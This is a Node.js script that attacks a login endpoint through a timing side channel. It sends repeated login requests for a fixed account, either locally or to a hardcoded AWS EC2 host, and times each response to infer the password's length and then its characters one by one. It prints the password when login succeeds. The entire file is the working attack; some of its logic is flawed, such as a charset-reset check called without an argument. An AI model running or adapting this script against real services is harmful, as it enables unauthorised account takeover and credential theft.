const fetch = require('node-fetch');
const {exampleCharSet} = require('./charSet.json');

const devEnv = process.env.NODE_ENV === 'develop';
const URL = devEnv ? 'http://localhost:8000/api/login' : 'http://ec2-107-23-202-11.compute-1.amazonaws.com/api/login';

let password = exampleCharSet[0];
let charIndex = 0;
let exampleCharSetPointer = 0;
let sizedMatchedTimes = 0;
let charIndexMatchedTimes = 0;
let matchedTimesThreshold = 5;

const exampleCharSetLength = exampleCharSet.length - 1;
const getNextFromExampleCharSet = () => exampleCharSet[exampleCharSetPointer++];
const isLastCharInExampleCharSet = (index) => exampleCharSetLength === index;
const sleep = async (ms) => {
    return await new Promise(resolve => setTimeout(resolve, ms));
};
const generateRandomInteger = (min, max) => {
    return ~~(min + Math.random() * (max + 1 - min))
};
const bruteForce = () => {
    if (isLastCharInExampleCharSet()) exampleCharSetPointer = 0;
    const newPassword = password.substr(0, charIndex) + getNextFromExampleCharSet() + password.substr(charIndex + 1);
    console.log(`newPassword: ${newPassword}`);
    password = newPassword;
};
const generatePassword = () => {
    if (sizedMatchedTimes === matchedTimesThreshold) {
        if (charIndexMatchedTimes === 0) {
            bruteForce(password);
        }
    } else if (sizedMatchedTimes === 0) {
        password += exampleCharSet[0];
    }
};
const calculateSizeMatched = (diff, threshold = 300) => diff > threshold;
const calculateCharIndexMatched = (diff, threshold = 300) => {
    let calcThreshold = (charIndex+2) * threshold;
    console.log(`diff: ${diff}`);
    console.log(`calcThreshold: ${calcThreshold}`);
    return diff > calcThreshold;
};

async function test() {
    const startTime = process.hrtime();
    const result = await fetch(URL, {
        method: 'post',
        headers: {'content-type': 'application/json'},
        body: JSON.stringify({accountId: 'asdasd', password})
    });
    const diff = process.hrtime(startTime);
    const mSec = diff[1].toString().substr(0, 3);
    const usefulDiff = Number(`${diff[0]}${mSec}`);
    const {authenticated} = await result.json();
    if (authenticated) {
        console.warn(`password: ${password}`);
        process.exit(0);
    } else {
        await sleep(200);
        let sizeMatched = calculateSizeMatched(usefulDiff);
        if (sizeMatched && sizedMatchedTimes !== matchedTimesThreshold) {
            sizedMatchedTimes++;
        } else if (sizedMatchedTimes === matchedTimesThreshold) {
            let charIndexMatched = calculateCharIndexMatched(usefulDiff);
            if (charIndexMatched && charIndexMatchedTimes !== matchedTimesThreshold) {
                console.log(`charIndexMatched: ${charIndexMatched}`);
                console.log(`charIndexMatchedTimes: ${charIndexMatchedTimes}`);
                charIndexMatchedTimes++;
            } else if (charIndexMatchedTimes === matchedTimesThreshold) {
                charIndex++;
                exampleCharSetPointer = 0;
                charIndexMatchedTimes = 0;
                console.log(`charIndex: ${charIndex}`);
            } else {
                charIndexMatchedTimes = 0;
            }
        } else {
            sizedMatchedTimes = 0;
        }
        console.log(`password: ${password}`);
        // console.log(`diff: ${usefulDiff}`);
        // console.log(`sizeMatched: ${sizeMatched} (${sizedMatchedTimes})`);
        await test(generatePassword());
    }
}

test();
